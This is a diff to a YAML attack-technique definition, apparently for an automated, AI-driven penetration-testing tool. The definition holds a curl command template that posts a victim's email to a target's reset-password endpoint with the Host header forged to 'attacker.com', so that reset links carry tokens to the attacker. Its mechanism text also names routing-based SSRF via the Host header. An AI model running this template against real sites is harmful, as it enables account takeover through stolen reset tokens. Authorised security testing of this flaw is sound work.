@@ -5,8 +5,7 @@ preconditions:
 - service.port==80
 parameters:
   target_ip: from_engagement.target_ip
-command_template: 'curl -s ''{target_url}/reset-password'' -H ''Host: attacker.com''
-  -d ''email=victim@target.com'''
+command_template: 'curl -s ''{target_url}/reset-password'' -H ''Host: attacker.com'' -d ''email=victim@target.com'''
 parser: web_response_parser
 expected_effects:
 - host_header_abused
@@ -14,7 +13,16 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "If app uses Host header to build reset links, inject attacker domain.\
-  \ Victim clicks link \u2192 token sent to attacker. Also: routing-based SSRF via\
-  \ Host header."
+mechanism: "If app uses Host header to build reset links, inject attacker domain. Victim clicks link \u2192 token sent to\
+  \ attacker. Also: routing-based SSRF via Host header."
 hacktricks_ref: network-services-pentesting/pentesting-web/uncovering-cloudflare.md
+references:
+  ocd_mindmap_node_ids:
+  - 0b77cc2186
+  - 2465607b64
+  - 389c58f7d2
+  - 69b367b75a
+  - 7ffa3d9172
+  - 9d6dd7b524
+  - c51a4811c0
+  - c530b6be65
